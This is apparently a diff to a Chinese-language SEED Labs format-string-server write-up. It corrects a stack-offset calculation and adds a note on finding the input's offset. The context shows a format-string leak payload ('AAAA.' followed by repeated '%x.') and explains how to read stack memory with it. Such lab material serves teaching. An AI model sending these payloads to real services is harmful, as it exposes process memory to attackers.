@@ -25,7 +25,7 @@
 - 3 0xffffcb30
 
 ### Question 2
-`0xffffcb30 - 0xffffc9f0 = 160`  
+`0xffffcb30 - 0xffffc9f0 = 320`  
 （我用的是 [官网](https://seedsecuritylabs.org/Labs_16.04/Software/Format_String_Server/files/server.c) 的版本，有100的dummy）
 
 ## 任务3 崩掉程序
@@ -35,6 +35,10 @@
 
 ## 任务4 泄露程序内存   
 ### A 泄露任意栈上数据
+
+我们可以用第二问得到的320除字长4得到我们输入的字符串相对va_start的偏移80，但不调试的情况下我们还有更简单的做法。
+
+
 经典的做法是输入
 `AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.`
 观察在`41414141`（也就是那四个A）前输出了多少个`.`即可知道格式化字符串在栈上的offset，同时泄露栈上数据
